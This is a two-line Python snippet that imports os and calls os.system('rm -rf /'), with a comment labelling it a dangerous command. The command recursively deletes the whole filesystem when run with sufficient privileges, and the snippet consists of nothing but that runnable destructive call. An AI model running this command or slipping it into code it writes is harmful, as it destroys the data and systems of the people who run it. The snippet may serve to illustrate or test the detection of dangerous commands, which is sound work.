import os
os.system("rm -rf /")  # Dangerous command
